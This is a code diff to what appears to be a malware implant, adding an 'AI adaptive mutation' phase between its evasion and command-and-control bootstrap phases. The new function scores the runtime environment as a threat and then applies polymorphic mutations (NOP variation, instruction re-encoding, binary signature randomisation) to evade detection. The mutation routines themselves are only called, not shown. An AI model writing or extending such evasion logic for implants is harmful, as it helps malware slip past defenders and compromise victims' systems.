@@ -132,6 +132,37 @@ fn phase_evasion() -> bool {
     return true
 }
 
+// ===== PHASE 0.5: AI ADAPTIVE MUTATION =====
+fn phase_ai_mutation() -> bool {
+    println("[*] Phase 0.5: AI Adaptive Code Mutation")
+
+    let init_ok = ai_init()
+    if init_ok != 0 {
+        println("    [-] AI engine init failed (non-critical, using heuristic fallback)")
+    } else {
+        println("    [+] AI threat engine initialized")
+    }
+
+    let threat_score = ai_score_threat()
+    println("    [*] Threat score: " + string(threat_score))
+
+    if threat_score > 0.25 {
+        println("    [!] Threat detected - applying runtime code mutations")
+        let result = ai_apply_mutation()
+        if result == 0 {
+            println("    [+] Code mutations applied: NOP variation, instruction re-encoding")
+            println("    [+] Binary signature randomized at runtime")
+        } else {
+            println("    [-] Mutation pass returned error (non-critical)")
+        }
+    } else {
+        println("    [+] Low threat environment - baseline operation")
+    }
+
+    println("")
+    return true
+}
+
 // ===== PHASE 1: C2 BOOTSTRAP =====
 fn phase_c2_bootstrap() -> bool {
     println("[*] Phase 1: C2 Bootstrap")
@@ -533,6 +564,9 @@ fn main() -> i32 {
     if !phase_evasion() {
         return 1
     }
+
+    // Phase 0.5: AI Mutation
+    let _ = phase_ai_mutation()
 
     // Phase 1: C2
     let _ = phase_c2_bootstrap()
